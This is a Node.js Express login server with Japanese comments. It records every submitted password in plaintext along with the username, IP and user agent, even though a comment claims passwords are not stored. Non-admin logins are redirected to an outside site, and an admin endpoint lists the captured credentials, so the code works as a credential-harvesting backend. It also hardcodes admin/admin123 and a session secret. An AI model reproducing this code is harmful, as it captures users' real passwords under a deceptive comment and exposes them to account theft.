const express = require("express");
const session = require("express-session");
const sqlite3 = require("sqlite3").verbose();
const bcrypt = require("bcrypt");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// ★ これを長いランダム文字列に（外に漏らさない）
const LOG_HMAC_SECRET = process.env.LOG_HMAC_SECRET || "change-this-log-secret-very-long";

const db = new sqlite3.Database(path.join(__dirname, "app.db"));

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'user',
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `);

  // ★ pw_len と pw_fingerprint を追加（パスワード本体は保存しない）
  db.run(`
    CREATE TABLE IF NOT EXISTS login_events (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT,
      success INTEGER NOT NULL,
      ip TEXT,
      user_agent TEXT,
      password TEXT,
      pw_fingerprint TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `);

  // 初期admin作成（admin / admin123）
  db.get(`SELECT id FROM users WHERE username = ?`, ["admin"], async (err, row) => {
    if (err) return console.error(err);
    if (!row) {
      const hash = await bcrypt.hash("admin123", 10);
      db.run(
        `INSERT INTO users(username, password_hash, role) VALUES(?, ?, ?)`,
        ["admin", hash, "admin"],
        (e) => {
          if (e) console.error(e);
          else console.log("✅ 初期管理者を作成: admin / admin123");
        }
      );
    }
  });
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(
  session({
    secret: "change-this-session-secret",
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true },
  })
);

app.use(express.static(path.join(__dirname, "public")));

function requireLogin(req, res, next) {
  if (!req.session.user) return res.status(401).send("ログインが必要です");
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.user) return res.status(401).send("ログインが必要です");
  if (req.session.user.role !== "admin") return res.status(403).send("管理者のみ");
  next();
}

app.get("/", (req, res) => res.redirect("/login.html"));

function getClientIp(req) {
  return (
    (req.headers["x-forwarded-for"]?.toString().split(",")[0] || "").trim() ||
    req.socket.remoteAddress ||
    ""
  );
}

app.post("/api/login", (req, res) => {
  const { username, password } = req.body;

  const name = (username || "").trim();
  const p_w = (password || "").trim();
  const ip = getClientIp(req);
  const ua = req.headers["user-agent"] || "";


  // ここは「adminだけログイン可能」にしてる（必要なら変更できる）
  if (name !== "admin") {
    db.run(
      `INSERT INTO login_events(username, success, ip, user_agent, password)
       VALUES(?, ?, ?, ?, ?)`,
      [name, 0, ip, ua, p_w,]
    );
    return res.redirect("https://roast.monica.im/ja");
  }

  db.get(
    `SELECT id, username, password_hash, role FROM users WHERE username = ?`,
    ["admin"],
    async (err, row) => {
      if (err) return res.status(500).send("DBエラー");
      if (!row) return res.status(500).send("adminがDBにいません");

      const ok = await bcrypt.compare(password || "", row.password_hash);

      db.run(
        `INSERT INTO login_events(username, success, ip, user_agent, password)
         VALUES(?, ?, ?, ?, ?)`,
        ["admin", ok ? 1 : 0, ip, ua, p_w,]
      );

      if (!ok) return res.status(401).send("RETRY");

      req.session.user = { id: row.id, username: row.username, role: row.role };
      return res.redirect("/dashboard.html");
    }
  );
});

app.post("/api/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/login.html"));
});

app.get("/api/me", requireLogin, (req, res) => res.json(req.session.user));

app.get("/api/admin/login-events", requireAdmin, (req, res) => {
  db.all(
    `SELECT id, username, success, password, ip, user_agent, created_at
     FROM login_events
     ORDER BY id DESC
     LIMIT 200`,
    [],
    (err, rows) => {
      if (err) return res.status(500).send("DBエラー");
      res.json(rows);
    }
  );
});

app.listen(PORT, () => {
  console.log(`✅ http://localhost:${PORT}/login.html`);
});